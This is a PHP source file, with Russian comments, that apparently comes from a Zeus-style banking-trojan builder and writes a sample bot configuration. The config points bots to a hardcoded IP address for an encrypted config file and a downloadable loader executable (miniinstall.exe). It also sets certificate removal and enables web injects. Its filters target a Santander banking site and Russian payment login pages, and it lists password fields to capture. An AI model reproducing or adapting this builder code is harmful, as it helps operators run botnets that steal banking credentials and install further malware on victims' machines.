<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// Сборка примера файла конфигурации.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Сборка примера файла конфигурации.

  IN $dir - директория, в которой будут сгенерированы файлы.
*/
function buildConfigSample($dir)
{
  $host = "http://localhost";
  
  $dt =  ";Build time:   ".BO_BUILDTIME."\r\n".
         ";Version:      ".BO_CLIENT_VERSION."\r\n\r\n".
         "entry \"StaticConfig\"\r\n".
         "  ;botnet \"btn1\"\r\n".
         "  timer_config 60 1\r\n".
         "  timer_logs 30 30\r\n".
         "  timer_stats 30 1\r\n".
         "  url_config \"http://141.136.17.181/q3WeFv573.bin\"\r\n".
         "  remove_certs 1\r\n".
         "  disable_tcpserver 0\r\n".
         "end\r\n\r\n".

         "entry \"DynamicConfig\"\r\n".
         "  url_loader \"http://141.136.17.181/miniinstall.exe\"\r\n".
  $dt .= "  file_webinjects \"webinjects.txt\"\r\n".
         "  entry \"AdvancedConfigs\"\r\n".
         "    ;\"http://advdomain/cfg1.bin\"\r\n".
         "  end\r\n".
         "  entry \"WebFilters\"\r\n".
         "    \"!*.microsoft.com/*\"\r\n".
         "    \"!http://*myspace.com*\"\r\n".
         "    \"https://www.gruposantander.es/*\"\r\n".
         "    \"!http://*odnoklassniki.ru/*\"\r\n".
         "    \"!http://vkontakte.ru/*\"\r\n".
         "    \"@*/login.osmp.ru/*\"\r\n".
         "    \"@*/atl.osmp.ru/*\"\r\n";
  $dt .= "  end\r\n".
         "  entry \"WebDataFilters\"\r\n".
         "    ;\"http://mail.rambler.ru/*\" \"passw;login\"\r\n".
         "  end\r\n".
         "  entry \"WebFakes\"\r\n".
         "    ;\"http://www.google.com\" \"http://www.yahoo.com\" \"GP\" \"\" \"\"\r\n".
         "  end\r\n";
  $dt .= "end\r\n";
  
  writeFile($dir."\config.txt", $dt);
  
  $dt = file_get_contents($GLOBALS['dir']['source']['other'].'\webinjects.txt');
  if(strlen($dt) < 10)fatalError("Failed to open web injects source file.");
  writeFile($dir.'\webinjects.txt', $dt);
}
?>